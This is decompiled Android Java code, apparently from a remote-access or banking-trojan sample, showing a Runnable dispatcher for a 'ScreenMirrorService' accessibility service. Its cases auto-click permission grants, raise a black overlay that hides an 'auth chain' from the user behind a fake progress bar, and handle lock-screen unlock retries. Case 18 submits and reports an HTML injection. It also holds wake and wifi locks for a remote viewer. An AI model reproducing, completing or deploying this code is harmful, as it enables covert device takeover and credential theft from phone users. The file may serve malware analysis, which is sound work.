// Decompiled with JADX from the REA-supplied audited engine JAR; not original source.
package d2;

import android.accessibilityservice.AccessibilityService;
import android.app.NotificationManager;
import android.net.wifi.WifiManager;
import android.os.Debug;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.PowerManager;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import e2.n1;
import f2.c0;
import f2.k0;
import f2.p0;
import lyr.stable.runtime.ScreenMirrorService;
import w1.b0;
import w1.b1;
import w1.j6;
import w1.lf;
import w1.n4;
import w1.p9;
import w1.r1;
import w1.r4;
import w1.rd;
import w1.s8;
import w1.wf;
import w1.z;

/* JADX INFO: compiled from: r8-map-id-5347474c40041fa035618ae5fd6f249b536e43095feee62dfa1b0bceecef7771 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class r implements Runnable {

    /* JADX INFO: renamed from: c, reason: collision with root package name */
    public final /* synthetic */ int f607c;

    public /* synthetic */ r(ScreenMirrorService screenMirrorService) {
        this.f607c = 22;
    }

    private final void b() {
        synchronized (ScreenMirrorService.B6) {
            ScreenMirrorService.E6 = false;
        }
    }

    private final void c() {
        synchronized (wf.f5439b) {
            try {
                long jCurrentTimeMillis = System.currentTimeMillis();
                r1 r1VarS = wf.S(jCurrentTimeMillis);
                boolean zA = r1VarS.a(jCurrentTimeMillis);
                Handler handler = wf.f5438a;
                handler.removeCallbacks(wf.R);
                handler.removeCallbacks(wf.T);
                lf lfVar = wf.N;
                wf.N = null;
                if (lfVar != null) {
                    handler.removeCallbacks(lfVar);
                }
                wf.r();
                AccessibilityService accessibilityService = wf.f5443f;
                if (accessibilityService != null) {
                    try {
                        NotificationManager notificationManager = (NotificationManager) accessibilityService.getSystemService("notification");
                        if (notificationManager != null) {
                            notificationManager.cancel(7302);
                        }
                    } catch (Throwable unused) {
                    }
                }
                wf.f5457u = false;
                wf.W();
                Handler handler2 = wf.f5438a;
                wf.f5440c.a();
                wf.f5462z = null;
                wf.A = null;
                wf.K = 0L;
                wf.L = 0L;
                wf.M = 0L;
                if (zA) {
                    wf.d(r1VarS);
                    wf.f5455s = true;
                    wf.f5460x = "black";
                    wf.E = 3600000L;
                    wf.D = r1VarS.f4973a;
                    wf.b0(jCurrentTimeMillis);
                } else {
                    wf.o();
                    wf.f5459w = false;
                    wf.f5455s = false;
                    wf.D = 0L;
                    wf.E = 3600000L;
                }
                wf.l0();
                wf.f5443f = null;
                Log.i("UpdateNotice", "overlay service detached: service_detached keepBlack=" + zA);
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    @Override // java.lang.Runnable
    public final void run() {
        Handler handler;
        n1 n1Var;
        String str;
        AccessibilityNodeInfo accessibilityNodeInfo = null;
        switch (this.f607c) {
            case 0:
                return;
            case 1:
                f2.w.f();
                return;
            case 2:
                f2.w.b();
                return;
            case 3:
                f2.w.d();
                return;
            case 4:
                k0.l();
                return;
            case 5:
                synchronized (p0.class) {
                    p0.f1293l = 0L;
                    break;
                }
                AccessibilityService accessibilityService = p0.f1295o;
                x1.x xVar = x1.x.f5960m;
                if (accessibilityService == null || !c0.k()) {
                    return;
                }
                if (xVar != null && xVar.h()) {
                    return;
                }
                try {
                    AccessibilityNodeInfo rootInActiveWindow = accessibilityService.getRootInActiveWindow();
                    try {
                        p0.s(accessibilityService, p0.f1296p, null, rootInActiveWindow);
                        p0.a0(rootInActiveWindow);
                        return;
                    } catch (Throwable th) {
                        th = th;
                        accessibilityNodeInfo = rootInActiveWindow;
                        try {
                            Log.w("SampleGrantClicker", "delayed f0: " + th.getMessage());
                            return;
                        } finally {
                            p0.a0(accessibilityNodeInfo);
                        }
                    }
                } catch (Throwable th2) {
                    th = th2;
                }
                break;
            case 6:
                synchronized (w1.n.f4563a) {
                    if (!w1.n.f4567e && (handler = w1.n.f4565c) != null) {
                        handler.removeCallbacksAndMessages(null);
                        HandlerThread handlerThread = w1.n.f4564b;
                        w1.n.f4564b = null;
                        w1.n.f4565c = null;
                        w1.n.f4566d = null;
                        if (handlerThread != null) {
                            handlerThread.quitSafely();
                            return;
                        }
                        return;
                    }
                    return;
                }
            case 7:
                ScreenMirrorService screenMirrorServiceU2 = ScreenMirrorService.U2();
                if (screenMirrorServiceU2 != null) {
                    screenMirrorServiceU2.A7();
                    return;
                }
                return;
            case 8:
                synchronized (j6.class) {
                    try {
                        if (j6.f4336e.isEmpty()) {
                            PowerManager.WakeLock wakeLock = j6.f4338g;
                            if (wakeLock != null && wakeLock.isHeld()) {
                                try {
                                    j6.f4338g.release();
                                    break;
                                } catch (Throwable unused) {
                                }
                            }
                            j6.f4338g = null;
                            WifiManager.WifiLock wifiLock = j6.f4339h;
                            if (wifiLock != null && wifiLock.isHeld()) {
                                try {
                                    j6.f4339h.release();
                                    break;
                                } catch (Throwable unused2) {
                                }
                            }
                            j6.f4339h = null;
                            Log.i("MirrorRecovery", "viewer locks released after grace");
                            return;
                        }
                        return;
                    } catch (Throwable th3) {
                        throw th3;
                    }
                }
            case 9:
                if (!s8.f5069k || s8.f5064f == null) {
                    return;
                }
                String[] strArr = s8.f5068j;
                if (strArr.length == 0) {
                    return;
                }
                int length = (s8.f5067i + 1) % strArr.length;
                s8.f5067i = length;
                s8.a(length);
                s8.f5059a.postDelayed(s8.f5072o, 2400L);
                return;
            case 10:
                if (!s8.f5069k || s8.f5062d == null) {
                    return;
                }
                long jMax = Math.max(0L, SystemClock.elapsedRealtime() - s8.f5066h);
                float fMin = 1.0f - Math.min(1.0f, jMax / 36000.0f);
                int iRound = Math.round((1.0f - (fMin * fMin)) * 89.0f) + 3;
                if (jMax > 36000) {
                    iRound = Math.min(96, ((int) ((jMax - 36000) / 4000)) + 92);
                }
                if (iRound > s8.f5062d.getProgress()) {
                    s8.i(iRound);
                }
                s8.f5059a.postDelayed(s8.f5073p, 200L);
                return;
            case 11:
                if (s8.f5069k) {
                    long j3 = s8.f5066h;
                    long jElapsedRealtime = SystemClock.elapsedRealtime();
                    if (!s8.n && jElapsedRealtime - j3 >= 60000) {
                        Log.w("PermissionBlackOverlay", "hard-hide after 60000ms — auth chain left mask up");
                        s8.d(s8.f5070l);
                        return;
                    } else {
                        if (s8.n) {
                            Log.i("PermissionBlackOverlay", "hard-hide skipped — chain still active");
                            return;
                        }
                        return;
                    }
                }
                return;
            case 12:
                s8.b();
                return;
            case 13:
                p9.g("service_cleanup");
                return;
            case 14:
                p9.t("keyguard_observed");
                return;
            case 15:
                p9.g("timeout");
                return;
            case 16:
                p9.n("unlock_retry");
                return;
            case 17:
                p9.t("screen_off");
                return;
            case 18:
                p9.l("html", "injection_submit", "", null);
                synchronized (p9.f4838b) {
                    n1Var = p9.D;
                    str = p9.f4860y;
                    break;
                }
                if (n1Var != null && str != null && !str.isEmpty()) {
                    try {
                        r4 r4Var = (r4) n1Var.f905c;
                        ScreenMirrorService screenMirrorService = r4Var.f4981e;
                        if (screenMirrorService != null) {
                            try {
                                b1.b(screenMirrorService).c(str);
                                break;
                            } catch (Throwable unused3) {
                            }
                            if (str.equals(r4Var.f4980d)) {
                                r4Var.f4980d = null;
                            }
                            r4.d("report:inject:submitted:".concat(str));
                        }
                        break;
                    } catch (Throwable unused4) {
                    }
                }
                p9.g("injection_submitted");
                return;
            case 19:
                p9.l("html", "html_close", "", null);
                p9.i();
                p9.g("html_close");
                return;
            case 20:
                Handler handler2 = b0.f3529a;
                long pss = Debug.getPss();
                if (pss < 0) {
                    pss = -1;
                }
                if (pss >= 0) {
                    b0.f3534f.accumulateAndGet(pss, new z());
                    return;
                }
                return;
            case 21:
                b();
                return;
            case 22:
                rd rdVar = ScreenMirrorService.n6;
                return;
            case 23:
                c();
                return;
            case 24:
                wf.F("timeout");
                return;
            case 25:
                wf.y();
                return;
            case 26:
                wf.Y("delayed_reattach");
                return;
            case 27:
                if (!wf.f5455s || wf.f5444g == null) {
                    return;
                }
                wf.q0();
                if (n4.G(wf.Q()) < 100) {
                    wf.f5438a.postDelayed(wf.U, 1000L);
                    return;
                }
                return;
            default:
                wf.P.o();
                wf.Y("window_changed");
                return;
        }
    }

    public /* synthetic */ r(int i3) {
        this.f607c = i3;
    }

    private final void a() {
    }
}
